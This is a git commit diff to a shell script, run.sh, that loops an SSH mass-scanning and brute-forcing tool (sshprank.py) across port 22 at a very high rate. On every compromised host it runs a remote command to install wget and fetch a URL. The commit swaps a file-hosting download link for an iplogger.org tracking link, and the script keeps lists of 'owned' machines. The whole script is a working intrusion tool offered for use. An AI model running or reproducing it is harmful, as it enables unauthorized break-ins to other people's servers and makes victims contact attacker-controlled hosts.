e1a0e7cb84d62847fd396c407b8270246b780940
samita100 <66769151+samita100@users.noreply.github.com>
2020-09-02 22:02:31 +0545

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,5 +1,5 @@
 while [ 1 != 0 ]
 do
-sudo python3 sshprank.py -m '-p22 --rate=1000000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://nextcloud-fi.webo.hosting/s/gfyBeBP8ozTodCt/download' -x 500 -S 500 -X 500
+sudo python3 sshprank.py -m '-p22 --rate=1000000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://iplogger.org/1UPF67' -x 500 -S 500 -X 500
 rm sshds.txt owned.txt
 done
